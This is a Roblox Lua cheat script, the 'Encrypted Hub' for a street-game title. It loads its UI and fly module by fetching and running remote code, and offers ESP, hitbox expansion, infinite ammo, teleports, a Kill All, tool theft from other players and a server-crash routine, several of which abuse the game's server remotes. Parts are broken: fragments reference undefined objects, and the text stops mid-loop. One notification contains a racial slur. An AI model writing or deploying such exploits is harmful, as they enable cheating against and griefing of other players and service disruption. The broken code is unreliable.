local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Encrypted Hub  | SW2 | FREE",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Loading...",
   LoadingSubtitle = "by Kryptic",
   Theme = "", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = nil, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "ehhub", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "EH | KEY VERIFICATION",
      Subtitle = ".",
      Note = "Buy A key At EHHUB", -- Use this to tell the user how to get a key
      FileName = "Key.txt", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"EHHUB"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local MainTab = Window:CreateTab("Main", 4483362458) -- Title, Image
local MainSection = MainTab:CreateSection("Main Features")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local player = Players.LocalPlayer

local dupeAmount = 10
local StatusLabel = MainTab:CreateLabel("Status: Waiting for action...")

-- Notification function with error handling
local function notify(message, time, type)
    local success, err = pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = type or "Info",
            Text = message,
            Duration = time or 5,
        })
    end)

    if not success then
        warn("Notification failed: " .. err)
    end
end


    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, true, game, 0)
    wait()
    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, false, game, 0)

    -- Move player to next step
    player.Character.HumanoidRootPart.CFrame = CFrame.new(954, 4.7, -61)
    wait(4)

local VisualsTab = Window:CreateTab("Visuals", 4483362458) -- Title, Image
local VisualsSection = VisualsTab:CreateSection("Visuals")

local Toggle = VisualsTab:CreateToggle({
   Name = "Name tag",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local esp_settings = { ---- table for esp settings 
    textsize = 8,
    colour = 255,255,255
}
 
local gui = Instance.new("BillboardGui")
local esp = Instance.new("TextLabel",gui) ---- new instances to make the billboard gui and the textlabel
 
 
 
gui.Name = "Cracked esp"; ---- properties of the esp
gui.ResetOnSpawn = false
gui.AlwaysOnTop = true;
gui.LightInfluence = 0;
gui.Size = UDim2.new(1.75, 0, 1.75, 0);
esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
esp.Text = ""
esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
esp.BorderSizePixel = 4;
esp.BorderColor3 = Color3.new(esp_settings.colour)
esp.BorderSizePixel = 0
esp.Font = "GothamSemibold"
esp.TextSize = esp_settings.textsize
esp.TextColor3 = Color3.fromRGB(esp_settings.colour) -- text colour
 
game:GetService("RunService").RenderStepped:Connect(function() ---- loops faster than a while loop :)
    for i,v in pairs (game:GetService("Players"):GetPlayers()) do
        if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil  then -- craeting checks for team check, local player etc
            esp.Text = "{"..v.Name.."}"
            gui:Clone().Parent = v.Character.Head
    end
end
end)
   end,
})

local Toggle = VisualsTab:CreateToggle({
   Name = "esp",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        
-- Preview: https://cdn.discordapp.com/attachments/796378086446333984/818089455897542687/unknown.png
-- Made by Blissful#4992
local Settings = {
    Box_Color = Color3.fromRGB(255, 0, 0),
    Tracer_Color = Color3.fromRGB(255, 0, 0),
    Tracer_Thickness = 1,
    Box_Thickness = 1,
    Tracer_Origin = "Bottom", -- Middle or Bottom if FollowMouse is on this won't matter...
    Tracer_FollowMouse = false,
    Tracers = true
}
local Team_Check = {
    TeamCheck = false, -- if TeamColor is on this won't matter...
    Green = Color3.fromRGB(0, 255, 0),
    Red = Color3.fromRGB(255, 0, 0)
}
local TeamColor = true

--// SEPARATION
local player = game:GetService("Players").LocalPlayer
local camera = game:GetService("Workspace").CurrentCamera
local mouse = player:GetMouse()

local function NewQuad(thickness, color)
    local quad = Drawing.new("Quad")
    quad.Visible = false
    quad.PointA = Vector2.new(0,0)
    quad.PointB = Vector2.new(0,0)
    quad.PointC = Vector2.new(0,0)
    quad.PointD = Vector2.new(0,0)
    quad.Color = color
    quad.Filled = false
    quad.Thickness = thickness
    quad.Transparency = 1
    return quad
end

local function NewLine(thickness, color)
    local line = Drawing.new("Line")
    line.Visible = false
    line.From = Vector2.new(0, 0)
    line.To = Vector2.new(0, 0)
    line.Color = color 
    line.Thickness = thickness
    line.Transparency = 1
    return line
end

local function Visibility(state, lib)
    for u, x in pairs(lib) do
        x.Visible = state
    end
end

local function ToColor3(col) --Function to convert, just cuz c;
    local r = col.r --Red value
    local g = col.g --Green value
    local b = col.b --Blue value
    return Color3.new(r,g,b); --Color3 datatype, made of the RGB inputs
end

local black = Color3.fromRGB(0, 0 ,0)
local function ESP(plr)
    local library = {
        --//Tracer and Black Tracer(black border)
        blacktracer = NewLine(Settings.Tracer_Thickness*2, black),
        tracer = NewLine(Settings.Tracer_Thickness, Settings.Tracer_Color),
        --//Box and Black Box(black border)
        black = NewQuad(Settings.Box_Thickness*2, black),
        box = NewQuad(Settings.Box_Thickness, Settings.Box_Color),
        --//Bar and Green Health Bar (part that moves up/down)
        healthbar = NewLine(3, black),
        greenhealth = NewLine(1.5, black)
    }

    local function Colorize(color)
        for u, x in pairs(library) do
            if x ~= library.healthbar and x ~= library.greenhealth and x ~= library.blacktracer and x ~= library.black then
                x.Color = color
            end
        end
    end

    local function Updater()
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 and plr.Character:FindFirstChild("Head") ~= nil then
                local HumPos, OnScreen = camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                if OnScreen then
                    local head = camera:WorldToViewportPoint(plr.Character.Head.Position)
                    local DistanceY = math.clamp((Vector2.new(head.X, head.Y) - Vector2.new(HumPos.X, HumPos.Y)).magnitude, 2, math.huge)
                    
                    local function Size(item)
                        item.PointA = Vector2.new(HumPos.X + DistanceY, HumPos.Y - DistanceY*2)
                        item.PointB = Vector2.new(HumPos.X - DistanceY, HumPos.Y - DistanceY*2)
                        item.PointC = Vector2.new(HumPos.X - DistanceY, HumPos.Y + DistanceY*2)
                        item.PointD = Vector2.new(HumPos.X + DistanceY, HumPos.Y + DistanceY*2)
                    end
                    Size(library.box)
                    Size(library.black)

                    --//Tracer 
                    if Settings.Tracers then
                        if Settings.Tracer_Origin == "Middle" then
                            library.tracer.From = camera.ViewportSize*0.5
                            library.blacktracer.From = camera.ViewportSize*0.5
                        elseif Settings.Tracer_Origin == "Bottom" then
                            library.tracer.From = Vector2.new(camera.ViewportSize.X*0.5, camera.ViewportSize.Y) 
                            library.blacktracer.From = Vector2.new(camera.ViewportSize.X*0.5, camera.ViewportSize.Y)
                        end
                        if Settings.Tracer_FollowMouse then
                            library.tracer.From = Vector2.new(mouse.X, mouse.Y+36)
                            library.blacktracer.From = Vector2.new(mouse.X, mouse.Y+36)
                        end
                        library.tracer.To = Vector2.new(HumPos.X, HumPos.Y + DistanceY*2)
                        library.blacktracer.To = Vector2.new(HumPos.X, HumPos.Y + DistanceY*2)
                    else 
                        library.tracer.From = Vector2.new(0, 0)
                        library.blacktracer.From = Vector2.new(0, 0)
                        library.tracer.To = Vector2.new(0, 0)
                        library.blacktracer.To = Vector2.new(0, 02)
                    end

                    --// Health Bar
                    local d = (Vector2.new(HumPos.X - DistanceY, HumPos.Y - DistanceY*2) - Vector2.new(HumPos.X - DistanceY, HumPos.Y + DistanceY*2)).magnitude 
                    local healthoffset = plr.Character.Humanoid.Health/plr.Character.Humanoid.MaxHealth * d

                    library.greenhealth.From = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY*2)
                    library.greenhealth.To = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY*2 - healthoffset)

                    library.healthbar.From = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y + DistanceY*2)
                    library.healthbar.To = Vector2.new(HumPos.X - DistanceY - 4, HumPos.Y - DistanceY*2)

                    local green = Color3.fromRGB(0, 255, 0)
                    local red = Color3.fromRGB(255, 0, 0)

                    library.greenhealth.Color = red:lerp(green, plr.Character.Humanoid.Health/plr.Character.Humanoid.MaxHealth);

                    if Team_Check.TeamCheck then
                        if plr.TeamColor == player.TeamColor then
                            Colorize(Team_Check.Green)
                        else 
                            Colorize(Team_Check.Red)
                        end
                    else 
                        library.tracer.Color = Settings.Tracer_Color
                        library.box.Color = Settings.Box_Color
                    end
                    if TeamColor == true then
                        Colorize(plr.TeamColor.Color)
                    end
                    Visibility(true, library)
                else 
                    Visibility(false, library)
                end
            else 
                Visibility(false, library)
                if game.Players:FindFirstChild(plr.Name) == nil then
                    connection:Disconnect()
                end
            end
        end)
    end
    coroutine.wrap(Updater)()
end

for i, v in pairs(game:GetService("Players"):GetPlayers()) do
    if v.Name ~= player.Name then
        coroutine.wrap(ESP)(v)
    end
end

game.Players.PlayerAdded:Connect(function(newplr)
    if newplr.Name ~= player.Name then
        coroutine.wrap(ESP)(newplr)
    end
end)

   end,
})

-- Initialize global variables
_G.espEnabled = _G.espEnabled or false
local espColor = espColor or Color3.new(1, 0, 0)  -- Default color is red
local espBoxes = espBoxes or {}  -- Stores ESP boxes for each player
local espConnection = nil  -- Keeps track of the RenderStepped connection

-- Function to create an ESP box around a player
local function createESPBox(player)
    if not player or not player.Character then return end

    -- Create a box or a part representing the ESP (as a simple example)
    local espPart = Instance.new("Part")
    espPart.Size = Vector3.new(4, 6, 4)
    espPart.Anchored = true
    espPart.CanCollide = false
    espPart.Transparency = 0.5
    espPart.Color = espColor
    espPart.Parent = game.Workspace

    -- Set position to the player's character
    espPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)

    -- Store the ESP box so it can be updated later
    espBoxes[player] = espPart
end

-- Function to remove ESP box for a player
local function removeESP()
    for _, box in pairs(espBoxes) do
        if box and box.Parent then
            box:Destroy()
        end
    end
    espBoxes = {}
end

-- Function to update ESP boxes (called every frame)
local function updateESP()
    for player, box in pairs(espBoxes) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            box.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
        else
            box:Destroy()
            espBoxes[player] = nil
        end
    end
end

local VisualsSection = VisualsTab:CreateSection("Security")

local Button = VisualsTab:CreateButton({
   Name = "hide name",
   Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local character = player.Character
    if character and character:FindFirstChild("Head") then
        local nameGui = character.Head:FindFirstChild("NameGui")
        if nameGui and nameGui:FindFirstChild("Main") then
            local nameLabel = nameGui.Main:FindFirstChild("Name")
            if nameLabel then
                nameLabel.Text = "Discord.gg/dkshub"  -- change dis with the name u want
            end
        end
    end
end   end,
})

local Button = VisualsTab:CreateButton({
   Name = "Hide level",
   Callback = function()
        for _, player in pairs(game.Players:GetPlayers()) do
    local character = player.Character
    if character and character:FindFirstChild("Head") then
        local nameGui = character.Head:FindFirstChild("NameGui")
        if nameGui and nameGui:FindFirstChild("Main") then
            local levelLabel = nameGui.Main:FindFirstChild("Level")
            if levelLabel then
                levelLabel.Text = "lvl 2317094803241264304"  -- This is the level changer :p
            end
        end
    end
end
   end,
})

local AimTab = Window:CreateTab("Aim", 4483362458) -- Title, Image
local AimSection = AimTab:CreateSection("Weapon Features")

local Toggle = AimTab:CreateToggle({
    Name = "Inf Ammo",
    CurrentValue = false,
    Flag = "InfiniteAmmo",
    Callback = function(state)
        _G.infiniteAmmo = state

        task.spawn(function()
            while _G.infiniteAmmo do
                local player = game.Players.LocalPlayer
                local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")

                if tool and tool:FindFirstChild("Stuff") then
                    local ammoValues = tool.Stuff.Values
                    ammoValues.CurrentAmmo.MaxValue = math.huge
                    ammoValues.StoredAmmo.MaxValue = math.huge
                    ammoValues.CurrentAmmo.Value = math.huge
                    ammoValues.StoredAmmo.Value = math.huge
                end

                task.wait(0.5) -- Prevents excessive loops
            end
        end)
    end
})

local runService = game:GetService("RunService")
local players = game:GetService("Players")
local localPlayer = players.LocalPlayer

_G.ToolStealing = false

local function stealTools()
    while _G.ToolStealing do
        for _, tool in ipairs(workspace:GetDescendants()) do
            if tool:IsA("Tool") and not tool:FindFirstAncestorOfClass("Model") then
                local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:EquipTool(tool)
                end
            end
        end
        runService.RenderStepped:Wait()
    end
end

local Toggle = AimTab:CreateToggle({
   Name = "Dupe gun",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
               local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local safeZones = game.Workspace.SafeZones:GetChildren()
        
        local closestSafeZone = nil
        local shortestDistance = math.huge 

        for _, safeZone in ipairs(safeZones) do
            local distance = (humanoidRootPart.Position - safeZone.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closestSafeZone = safeZone
            end
        end
        
        if closestSafeZone then
            humanoidRootPart.CFrame = closestSafeZone.CFrame
            character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) 
        else
            warn("No safe zones found.")
        end
    end
})

local hitboxColor = Color3.fromRGB(255, 255, 255)  -- Default color

local Slider = AimTab:CreateSlider({
    Name = "Hitbox Size",
    Range = {2, 30},
    Increment = 1,
    Suffix = "HBES",
    CurrentValue = 2,
    Flag = "HitboxSize",
    Callback = function(size)
        for _, player in pairs(game.Players:GetPlayers()) do
            if player.Character and player ~= game.Players.LocalPlayer then
                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.Size = Vector3.new(size, size, size)
                    hrp.Transparency = 0.8
                    hrp.BrickColor = BrickColor.new(hitboxColor)  -- Use the correct property for color
                    hrp.CanCollide = false
                end
            end
        end
    end
})

local ColorPicker = AimTab:CreateColorPicker({
    Name = "Hit Box Color",
    Color = Color3.fromRGB(255,255,255),
    Flag = "ColorPicker1", -- A flag is the identifier for the configuration file
    Callback = function(Value)
        -- The function that takes place every time the color picker is moved/changed
        hitboxColor = Value  -- Update the hitbox color with the selected color
    end
})

local TeleportsTab = Window:CreateTab("Teleports", 4483362458) -- Title, Image
local TeleportsSection = TeleportsTab:CreateSection("Player Teleport")

local Input = TeleportsTab:CreateInput({
    Name = "Username",
    PlaceholderText = "username",
    RemoveTextAfterFocusLost = false,
    Callback = function(v)
        local found = false
        local inputName = v:lower()

        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Name:lower():sub(1, #inputName) == inputName then
                playerteleport = player.Name
                found = true
                break
            end
        end

        if not found then
            Rayfield:Notify({
                Title = "Error",
                Content = 'No player found starting with "' .. v .. '".',
                Duration = 4,
                Type = "Error"
            })
        end
    end
})

local Button = TeleportsTab:CreateButton({
    Name = "tp to player",
    Callback = function()
        if playerteleport then
            local player = game.Players:FindFirstChild(playerteleport)
            if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
            end
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "No player selected to teleport.",
                Duration = 4,
                Type = "Error"
            })
        end
    end
})

local TeleportsSection = TeleportsTab:CreateSection("Main Teleports")

local Button = TeleportsTab:CreateButton({
    Name = "Apartment 1",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4, 4, 50)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Apartment 2",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2570, 4, -107)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Gun Store",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-276, 4, 30)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Dealership",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(842, 5, -6)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Pharmacy",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(42, 5, -258)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Bank",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-535, 5, -347)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Cap Store",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-159, 5, 8)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Shit/Pant Store",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-125, 5, 38)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Chain Store",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(39, 5, -232)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Boxing Gym",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(258, 5, -99)
end
})

local TeleportsSection = TeleportsTab:CreateSection("Dealer Teleports")

local Button = TeleportsTab:CreateButton({
    Name = "Card Dealer",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(226, 4, -543)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Illeagal Dealer",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-142, 5, 190)
end
})

local TeleportsSection = TeleportsTab:CreateSection("Job Teleports")

local Button = TeleportsTab:CreateButton({
    Name = "Mop Job",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-102, 5, 20)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Pizza Job",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(163, 5, 49)
end
})

local Button = TeleportsTab:CreateButton({
    Name = "Box Job",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-118, 5, 300)
end
})

local PlayerTab = Window:CreateTab("Player", 4483362458) -- Title, Image
local PlayerSection = PlayerTab:CreateSection("Player")

local Slider = PlayerTab:CreateSlider({
   Name = "Walkspeed",
   Range = {0, 300},
   Increment = 1,
   Suffix = "Speed",
   CurrentValue = 16,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
   end,
})

local Toggle = PlayerTab:CreateToggle({
   Name = "No Clip",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local nocliptoggle = selfsector.element('Toggle', 'Noclip', false, function(v)
    _G.noclip = v.Toggle

    if not _G.noclip then
        local character = game.Players.LocalPlayer.Character
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") and part.Parent.Name ~= "Wings" then
                    part.CanCollide = true
                end
            end
        end
    end
    
    while _G.noclip do
        game:GetService("RunService").RenderStepped:wait()
        local character = game.Players.LocalPlayer.Character
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end
end)
  
        end
})

local Toggle = PlayerTab:CreateToggle({
   Name = "Fly V3",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
   end,
})

local VehicleTab = Window:CreateTab("Vehicle", 4483362458) -- Title, Image
local VehicleSection = VehicleTab:CreateSection("THIS TAB IS BUGGED - WIP")

local Toggle = VehicleTab:CreateToggle({
   Name = "Unlock All Cars",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
                              _G.Unlock = v.Toggle
                        while _G.Unlock do
                            wait(0.5)
                            for i,v in pairs(workspace.SpawnedVehicles:GetChildren()) do
                                v.DriveSeat.Disabled = false
                                    v.DriveSeat.CanTouch = true
                            end
                        end
                            end})

local ExtraTab = Window:CreateTab("Extra", 4483362458) -- Title, Image
local ExtraSection = ExtraTab:CreateSection("Misc")

local Toggle = PlayerTab:CreateToggle({
   Name = "GodMode",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local player = game.Players.LocalPlayer
        local character = player.Character
        if character and character:FindFirstChild("UpperTorso") and character:FindFirstChild("RightHand") then
            local fist = player.Backpack:FindFirstChild("Fist")
            if fist and fist:FindFirstChild("Script") then
                local script = fist.Script
                if script:FindFirstChild("egma") and script:FindFirstChild("legma") then
                    script.egma:FireServer(character.UpperTorso, -math.huge, character.RightHand)
                    script.legma:FireServer(character.UpperTorso, -math.huge, character.RightHand)
                    Rayfield:Notify({
                        Title = "Success",
                        Content = "God Mode Activated!",
                        Duration = 4,
                        Image = 4483362458,
                        Actions = {}
                    })
                else
                    Rayfield:Notify({
                        Title = "Error",
                        Content = "Required scripts not found!",
                        Duration = 4,
                        Image = 4483362458,
                        Actions = {}
                    })
                end
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Fist tool not found!",
                    Duration = 4,
                    Image = 4483362458,
                    Actions = {}
                })
            end
        else
            Rayfield:Notify({
                Title = "Error",
                Content = "Character parts missing!",
                Duration = 4,
                Image = 4483362458,
                Actions = {}
            })
        end
    end
})

local Toggle = ExtraTab:CreateToggle({
   Name = "One Punch",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        _G.OnePunch = false 

local function activateTool()
    local character = player.Character or player.CharacterAdded:Wait()
    local tool = character:FindFirstChild("Fist")
    
    if tool and _G.OnePunch then
        for _, target in ipairs(Players:GetPlayers()) do
            if target ~= player and target.Character and target.Character:FindFirstChild("UpperTorso") then
                local distance = (target.Character.UpperTorso.Position - character.RightHand.Position).Magnitude
                
                if distance <= 3 then
                    tool.Script.legma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, character.RightHand)
                    tool.Script.egma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, character.RightHand)
                    return
                end
            end
        end
    end
end

mouse.Button1Down:Connect(function()
    activateTool()
end)

local nocliptoggle = selfsector.element('Toggle', 'One Punch', false, function(v)
    _G.OnePunch = v.Toggle
end)

   end,
    })

local Toggle = ExtraTab:CreateToggle({
   Name = "Kill All",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        for _, player in pairs(game.Players:GetChildren()) do
            if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("UpperTorso") then
                local fist = game.Players.LocalPlayer.Backpack:FindFirstChild("Fist")
                if fist and fist:FindFirstChild("Script") then
                    fist.Script.egma:FireServer(player.Character.UpperTorso, player.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
                    fist.Script.legma:FireServer(player.Character.UpperTorso, player.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
                end
            end
            task.wait(0.3) -- Prevents overload
        end
        Rayfield:Notify({
            Title = "Kill All Activated",
            Content = "Attempted to kill all players.",
            Duration = 4,
            Image = 4483362458,
            Actions = {}
        })
    end
})

local Toggle = ExtraTab:CreateToggle({
   Name = "Tool Stealing",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local Players = game:GetService("Players")
local player = Players.LocalPlayer

local function stealTool(targetPlayer)
    local targetCharacter = targetPlayer.Character
    if targetCharacter then
        for _, tool in ipairs(targetCharacter:GetChildren()) do
            if tool:IsA("Tool") then
                tool.Parent = player.Backpack
                print("Stole tool: " .. tool.Name .. " from " .. targetPlayer.Name)
            end
        end
    end
end

for _, targetPlayer in ipairs(Players:GetPlayers()) do
    if targetPlayer ~= player then
        stealTool(targetPlayer)
    end
end

Players.PlayerAdded:Connect(function(targetPlayer)
    targetPlayer.CharacterAdded:Connect(function()
        stealTool(targetPlayer)
    end)
end)

   end,
})

local Toggle = ExtraTab:CreateToggle({
   Name = "Spin Bot",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local spinAnimationId = "rbxassetid://11475426274"  -- Replace with desired spin animation ID
        local spinSpeed = 200 

        local crouchAnimation = Instance.new("Animation")
        crouchAnimation.AnimationId = spinAnimationId
        local crouchAnimationTrack = humanoid:LoadAnimation(crouchAnimation)

        -- Toggle the spin bot on/off based on the value
        if Value then
            -- Turn on Spin Bot
            crouchAnimationTrack:Play()
            while Value do
                character:SetPrimaryPartCFrame(character.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0))
                wait(0.001)
            end
            crouchAnimationTrack:Stop()
        else
            -- Turn off Spin Bot
            crouchAnimationTrack:Stop()
        end
   end,
})

local Toggle = ExtraTab:CreateToggle({
   Name = "Godmode All",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local toggle = section4.element('Button', 'Godmode All', false, function(v)
    for i,v in pairs(game.Players:GetChildren()) do
        wait(0.3)
        print(v.Name)
        if v.Character then
            if v.Character:FindFirstChild("UpperTorso") then
                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
                wait()
                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
                game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(v.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
            end
        end
    end
    Notif:Notify("Attempted to godmode all", 4, "information")
end)

   end,
})

local Toggle = ExtraTab:CreateToggle({
   Name = "Instant Prompt",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        -- Loop Instant Proximity Prompt By DIR (TheUberAccount_x)
local Workspace = game:GetService("Workspace")

local function updateProximityPrompts()
    for i, v in ipairs(Workspace:GetDescendants()) do
        if v.ClassName == "ProximityPrompt" then
            v.HoldDuration = 0.0001
        end
    end
end

updateProximityPrompts()

Workspace.DescendantAdded:Connect(function(descendant)
    if descendant.ClassName == "ProximityPrompt" then
        descendant.HoldDuration = 0.0001
    end
end)

game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "Instant Prompt ui",
Text = "Made by theyfwdk", 

Button1 = "ok nigga",
Duration = 30 
})
   end,
})

local TrollTab = Window:CreateTab("Troll", 4483362458) -- Title, Image
local TrollSection = TrollTab:CreateSection("Main Troll")

local Toggle = TrollTab:CreateToggle({
   Name = "Crash Server",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local toggle = section4.element('Button', 'Crash Server', false, function(v)
    game:GetService("RunService"):Set3dRenderingEnabled(false)
    Notif:Notify("Started crashing, stay in a safezone.", 4, "information")
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "ONTOP")

    wait(3)
    for i = 1, 20 do
